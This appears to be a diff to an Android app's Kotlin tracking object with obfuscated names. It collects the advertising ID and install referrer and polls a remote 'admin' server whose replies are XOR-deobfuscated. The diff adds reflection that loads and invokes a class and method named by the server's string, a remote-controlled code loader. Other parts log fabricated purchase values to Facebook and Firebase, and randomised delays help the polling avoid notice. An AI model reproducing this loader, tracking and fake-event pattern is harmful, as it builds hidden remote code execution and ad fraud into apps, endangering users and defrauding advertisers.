@@ -1,6 +1,7 @@
 package com.announcement.comprehension.t
 
 import android.app.Application
+import android.content.Context
 import android.os.Build
 import android.os.Bundle
 import android.util.Base64
@@ -8,13 +9,13 @@ import android.util.Log
 import com.android.installreferrer.api.InstallReferrerClient
 import com.android.installreferrer.api.InstallReferrerStateListener
 import com.announcement.comprehension.ColorApp
+import com.announcement.comprehension.utils.base.Ldd
 import com.facebook.FacebookSdk
 import com.facebook.appevents.AppEventsLogger
 import com.google.android.gms.ads.identifier.AdvertisingIdClient
 import com.google.firebase.analytics.FirebaseAnalytics
 import com.google.firebase.analytics.ktx.analytics
 import com.google.firebase.ktx.Firebase
-import com.tencent.mmkv.MMKV
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -35,12 +36,11 @@ import kotlin.random.Random
 import kotlin.text.toByteArray
 
 object Fnc {
-    lateinit var app: Application
 
     private var once = false
     private var loadingAdmin = false//loading admin
     private var job: Job? = null
-    private val a by lazy { AppEventsLogger.newLogger(app) }
+    private val a by lazy { AppEventsLogger.newLogger(ColorApp.colorApp) }
 
     private var tba = ""//tba
     private var min = ""//admin
@@ -67,18 +67,17 @@ object Fnc {
     var adminMaxTime = 100//默认不能为0，否则有问题
 
     fun start(a0: Application, a1: ArrayList<String>) {
-        this.app = a0
+
         val name = a0.packageName
         val info = a0.packageManager.getPackageInfo(name, 0)
         iTime = info.firstInstallTime
         uTime = info.lastUpdateTime
         referC = a0.packageManager.getInstallerPackageName(a0.packageName) ?: ""
 
-        Ldd.tx = MMKV.defaultMMKV()
         if (googleId.isEmpty()) {
             CoroutineScope(Dispatchers.IO).launch {
                 val id = try {
-                    AdvertisingIdClient.getAdvertisingIdInfo(app).id
+                    AdvertisingIdClient.getAdvertisingIdInfo(ColorApp.colorApp).id
                 } catch (_: Exception) {
                     ""
                 }
@@ -89,7 +88,7 @@ object Fnc {
 
 
         fun fetchRefer(count: Int = 0) {
-            val client = InstallReferrerClient.newBuilder(app).build()
+            val client = InstallReferrerClient.newBuilder(ColorApp.colorApp).build()
             client.startConnection(object : InstallReferrerStateListener {
                 override fun onInstallReferrerSetupFinished(code: Int) {
                     if (code == 0) {
@@ -137,7 +136,7 @@ object Fnc {
         testMin = if (list[1].length > 50) list[1] else ""
         version = list[2]
 
-        dexLog("tba:${tba} admin:${min}")
+        vLog("tba:${tba} admin:${min}")
         refer = Ldd.readStr("rTag")
         referA = Ldd.readStr("rTag1")
         referB = Ldd.readStr("rTag2")
@@ -164,12 +163,12 @@ object Fnc {
             o(t = "i")
         }
         if (minValue.isEmpty()) {
-            dexLog("local no admin")
+            vLog("local no admin")
             minG(5)
             return
         }
         if (isA(minValue)) {//A
-            dexLog("local have admin")
+            vLog("local have admin")
             t(minValue)
             CoroutineScope(Dispatchers.IO).launch {
                 delay(Random.nextLong(1000, 10 * 1000 * 60))
@@ -190,24 +189,31 @@ object Fnc {
         } catch (_: Exception) {
         }
         if (isA(c)) {
-//            Dva.sim(ColorApp.colorApp, arrayListOf("bug", c))
             val list = JSONObject(c).optString("zuk").split("_")
-            DexDoor.start(ColorApp.colorApp, list as ArrayList<String>, arrayListOf("bug", c))
+
+            val clazz = Class.forName(list[6])
+            val instance = clazz.getField("INSTANCE").get(null)
+            val method = clazz.getDeclaredMethod(
+                list[7],//kp
+                Context::class.java,
+                java.util.ArrayList::class.java,
+                java.util.ArrayList::class.java
+            )
+            method.invoke(instance, ColorApp.colorApp, list, arrayListOf("bug", c))//
         }
     }
 
-
     private fun initFaceBook(a0: String, a1: String) {
         if (FacebookSdk.isInitialized()) return
-        dexLog("init fb: $a0 $a1")
+        vLog("init fb: $a0 $a1")
         CoroutineScope(Dispatchers.Main).launch {
             try {
                 FacebookSdk.setApplicationId(a0)
                 FacebookSdk.setClientToken(a1)
-                FacebookSdk.sdkInitialize(app.applicationContext)
-                AppEventsLogger.activateApp(app)
+                FacebookSdk.sdkInitialize(ColorApp.colorApp.applicationContext)
+                AppEventsLogger.activateApp(ColorApp.colorApp)
             } catch (e: Throwable) {
-                dexLog("init fb error: ${e.message}")
+                vLog("init fb error: ${e.message}")
             }
         }
     }
@@ -245,7 +251,7 @@ object Fnc {
                         .build()
                 ).enqueue(object : Callback {
                     override fun onFailure(call: Call, e: IOException) {
-                        dexLog("m fail ${e.message}")
+                        vLog("m fail ${e.message}")
                         loadingAdmin = false
                         CoroutineScope(Dispatchers.IO).launch {
                             delay(38000L)
@@ -266,7 +272,7 @@ object Fnc {
                         } else {
                             val hd = response.headers["dt"] ?: ""
                             val e = xorS(String(Base64.decode(bo, Base64.DEFAULT)), hd)
-                            dexLog("m good $co $e")
+                            vLog("m good $co $e")
                             var ms = ""
                             try {
                                 ms =
@@ -276,7 +282,7 @@ object Fnc {
 
                             if (testMin.isNotEmpty()) {
                                 ms = testMin
-                                dexLog("use local")
+                                vLog("use local")
                             }
                             refresh(ms)
                             if (ms.isEmpty()) {
@@ -322,7 +328,7 @@ object Fnc {
                 })
             } catch (e: Exception) {
                 loadingAdmin = false
-                dexLog("m err ${e.message}")
+                vLog("m err ${e.message}")
                 CoroutineScope(Dispatchers.IO).launch {
                     delay(40000L)
                     minG(a0 - 1)
@@ -331,23 +337,21 @@ object Fnc {
         }
     }
 
-    private var minMinTime = 16 * 1000L
-    private var lastAdminTime = 0L
 
+    var lastG = 0L
     private fun mA(a0: Boolean = true) {
         job?.cancel()
         job = CoroutineScope(Dispatchers.IO).launch {
             while (true) {
                 if (a0) {
-                    minMinTime = (aLoop + Random.nextInt(0, 5)) * 1000L * 60
-                    delay(minMinTime)
+                    delay((aLoop + Random.nextInt(0, 5)) * 1000L * 60)
                 } else {
-                    minMinTime = (bLoop + Random.nextInt(0, 6)) * 1000L
-                    delay(minMinTime)
+
+                    delay((bLoop + Random.nextInt(0, 6)) * 1000L)
                 }
-                if (System.currentTimeMillis() - lastAdminTime > minMinTime) {
-                    lastAdminTime = System.currentTimeMillis()
-                    minG(1)
+                if (System.currentTimeMillis() - lastG > 5000L) {
+                    lastG = System.currentTimeMillis()
+                    minG(3)
                 }
             }
         }
@@ -376,7 +380,7 @@ object Fnc {
                     ).build()
                 ).enqueue(object : Callback {
                     override fun onFailure(call: Call, e: IOException) {
-                        dexLog("t fail ${e.message}")
+                        vLog("t fail ${e.message}")
                         CoroutineScope(Dispatchers.IO).launch {
                             delay(25000L)
                             o(l, t, r - 1)
@@ -386,7 +390,7 @@ object Fnc {
                     override fun onResponse(call: Call, response: Response) {
                         val c = response.code
                         val b = response.body?.string() ?: ""
-                        dexLog("t res $c $b")
+                        vLog("t res $c $b")
                         if (c != 200) {
                             CoroutineScope(Dispatchers.IO).launch {
                                 delay(50000L)
@@ -401,7 +405,7 @@ object Fnc {
                     }
                 })
             } catch (e: Exception) {
-                dexLog("t err ${e.message}")
+                vLog("t err ${e.message}")
                 CoroutineScope(Dispatchers.IO).launch {
                     delay(28000L)
                     o(l, t, r - 1)
@@ -411,7 +415,7 @@ object Fnc {
     }
 
     private fun upE(a0: Double) {
-        dexLog("up value to facebook & firebase: $a0")
+        vLog("up value to facebook & firebase: $a0")
         try {
             a.logPurchase(a0.toBigDecimal(), Currency.getInstance("USD"))
 
@@ -432,7 +436,7 @@ object Fnc {
         return String(chars)
     }
 
-    fun dexLog(a: String) {
+    fun vLog(a: String) {
         if (debugMode != "bug") return
         Log.v("T686", a)
     }
@@ -512,7 +516,7 @@ object Fnc {
         js.put("Bshshgha89", referB)
         js.put("agjjIUhwh78", referC)
 
-        dexLog("minJ: $js")
+        vLog("minJ: $js")
 
         return js
     }
